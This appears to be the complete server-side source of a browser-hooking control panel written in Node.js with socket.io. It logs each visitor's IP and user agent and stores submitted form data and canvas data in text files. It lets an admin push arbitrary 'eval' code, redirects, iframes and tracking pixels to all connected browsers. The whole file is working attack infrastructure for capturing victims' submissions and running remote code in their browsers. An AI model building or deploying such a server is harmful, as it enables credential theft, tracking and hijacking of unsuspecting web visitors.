var express = require('express');
var app = express()
var server = app.listen(3000);
var io = require('socket.io')(server);
var fs = require('fs');

function log(type, file, data) {
  if(type == 'VERBOSE') {
    fs.appendFile(file, JSON.stringify(data) + '\r\n');
    console.log(data);
  }
  else if (type == 'FILE') {
    fs.appendFile(file, JSON.stringify(data) + '\r\n');
  }
}

app.use(express.static('static'));

io.on('connection', function (socket) {

// client
socket.on('client', function(data) {
  socket.join('clients');

  var data = {
    date: Date(),
    ip: socket.handshake.address,
    useragent: socket.handshake.headers['user-agent']
  }

  log('VERBOSE', 'log.txt', data);
  // refresh adminpanel
  socket.to('admin').emit('logs', data);
});

// submit
socket.on('submit', function(data) {

  var data = {
    date: Date(),
    ip: socket.handshake.address,
    submit: data
  }
  delete data.submit.undefined;

  log('VERBOSE', 'data.txt', data);
  
  // refresh adminpanel
  socket.to('admin').emit('submit', data);
});

// canvas
socket.on('canvas', function(data) {

  var data = {
    date: Date(),
    ip: socket.handshake.address,
    canvas: data
  }

  log('FILE', 'canvas.txt', data);
  
  // refresh adminpanel
  socket.to('admin').emit('canvas', data);
});

// admin
socket.on('admin', function(data) {
  socket.join('admin');
  var clientsRoom = socket.nsp.adapter.rooms.clients || {};
  io.sockets.to('admin').emit('admin', Object.keys(clientsRoom).length); // number of clients currently online
});

// eval
socket.on('eval', function(data) {
  socket.broadcast.to('clients').emit('eval', data);
});

// redirect
socket.on('redirect', function(data) {
  socket.broadcast.to('clients').emit('redirect', data);
});

// pixel
socket.on('pixel', function(data) {
  socket.broadcast.to('clients').emit('pixel', data);
});

// iframe
socket.on('iframe', function(data) {
  socket.broadcast.to('clients').emit('iframe', data);
});

});
